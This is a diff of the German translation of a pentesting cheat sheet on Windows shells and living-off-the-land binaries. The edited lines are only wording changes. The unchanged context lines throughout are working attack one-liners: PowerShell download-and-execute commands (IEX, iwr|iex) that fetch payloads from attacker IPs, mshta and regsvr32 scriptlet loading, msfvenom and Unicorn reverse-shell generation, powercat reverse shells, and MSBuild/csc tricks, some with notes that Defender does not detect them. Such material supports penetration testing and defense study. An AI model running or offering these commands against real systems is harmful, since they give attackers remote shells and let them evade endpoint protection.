@@ -4,7 +4,7 @@
 
 ## Lolbas
 
-Die Seite [lolbas-project.github.io](https://lolbas-project.github.io/) ist für Windows, wie [https://gtfobins.github.io/](https://gtfobins.github.io/) für Linux.\
+Die Seite [lolbas-project.github.io](https://lolbas-project.github.io/) ist für Windows, wie [https://gtfobins.github.io/](https://gtfobins.github.io/) für Linux ist.\
 Offensichtlich gibt es **keine SUID-Dateien oder sudo-Rechte in Windows**, aber es ist nützlich zu wissen, **wie** einige **Binaries** (miss)braucht werden können, um eine Art unerwarteter Aktionen wie **die Ausführung beliebigen Codes** durchzuführen.
 
 ## NC
@@ -81,8 +81,8 @@ powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000
 Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
 ```
-Prozess, der einen Netzwerkaufruf durchführt: **powershell.exe**\
-Payload auf der Festplatte geschrieben: **NEIN** (_zumindest nirgendwo, wo ich es mit procmon finden konnte!_)
+Prozess, der einen Netzwerkaufruf ausführt: **powershell.exe**\
+Payload auf der Festplatte geschrieben: **NEIN** (_zumindest nirgendwo, wo ich mit procmon suchen konnte!_)
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
@@ -165,7 +165,7 @@ Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given
 
 ## **Rundll32**
 
-[**Dll Hallo Welt Beispiel**](https://github.com/carterjones/hello-world-dll)
+[**Dll Hello World Beispiel**](https://github.com/carterjones/hello-world-dll)
 
 - [Von hier](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ```bash
@@ -224,7 +224,7 @@ regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
 #### Regsvr32 -sct
 
 [**Von hier**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
-```markup
+```html
 <?XML version="1.0"?>
 <!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
 <!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
@@ -279,8 +279,8 @@ msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > sh
 ```bash
 \\webdavserver\folder\batchfile.bat
 ```
-Prozess, der einen Netzwerkaufruf durchführt: **svchost.exe**\
-Payload auf der Festplatte geschrieben: **WebDAV-Client-Cache**
+Prozess, der einen Netzwerkaufruf ausführt: **svchost.exe**\
+Payload auf der Festplatte geschrieben: **WebDAV-Clientlokalcache**
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
 impacket-smbserver -smb2support kali `pwd`
@@ -332,7 +332,7 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 ```
 cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
 ```
-Sie können diese Technik verwenden, um die Anwendungs-Whitelisting- und Powershell.exe-Beschränkungen zu umgehen. Sie werden mit einer PS-Shell aufgefordert.\
+Sie können diese Technik verwenden, um die Anwendungs-Whitelist und die Einschränkungen von Powershell.exe zu umgehen. Sie werden mit einer PS-Shell aufgefordert.\
 Laden Sie dies einfach herunter und führen Sie es aus: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
@@ -345,7 +345,7 @@ Kompiliere C#-Code auf der Opfermaschine.
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
 ```
-Sie können eine grundlegende C# Reverse-Shell von hier herunterladen: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
+Sie können eine grundlegende C# Reverse Shell von hier herunterladen: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
 
 **Nicht erkannt**
 
@@ -383,7 +383,7 @@ Starten Sie den Dienst des Skripts auf einem Webserver und führen Sie es am End
 ```
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
-Defender erkennt es (noch) nicht als bösartigen Code (3.04.2019).
+Defender erkennt es (noch) nicht als bösartigen Code (Stand: 3.04.2019).
 
 **TODO: Überprüfen Sie andere nishang-Shells**
 
@@ -391,15 +391,15 @@ Defender erkennt es (noch) nicht als bösartigen Code (3.04.2019).
 
 [**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)
 
-Laden Sie es herunter, starten Sie einen Webserver, starten Sie den Listener und führen Sie es auf der Seite des Opfers aus:
+Laden Sie herunter, starten Sie einen Webserver, starten Sie den Listener und führen Sie es auf der Seite des Opfers aus:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-Defender erkennt es (noch) nicht als bösartigen Code (3.04.2019).
+Defender erkennt es (noch) nicht als bösartigen Code (Stand: 3.04.2019).
 
 **Weitere Optionen, die von powercat angeboten werden:**
 
-Bind shells, Reverse shell (TCP, UDP, DNS), Port-Umleitung, hochladen/herunterladen, Payloads generieren, Dateien bereitstellen...
+Bind shells, Reverse shell (TCP, UDP, DNS), Port-Umleitung, Upload/Download, Payloads generieren, Dateien bereitstellen...
 ```
 Serve a cmd Shell:
 powercat -l -p 443 -e cmd
@@ -434,11 +434,11 @@ Erstellen Sie eine PowerShell-Version der Metasploit-Hintertür mit Unicorn.
 ```
 python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
 ```
-Starte msfconsole mit der erstellten Ressource:
+Starten Sie msfconsole mit der erstellten Ressource:
 ```
 msfconsole -r unicorn.rc
 ```
-Starten Sie einen Webserver, der die _powershell_attack.txt_-Datei bereitstellt, und führen Sie sie beim Opfer aus:
+Starte einen Webserver, der die _powershell_attack.txt_ Datei bereitstellt und führe sie beim Opfer aus:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
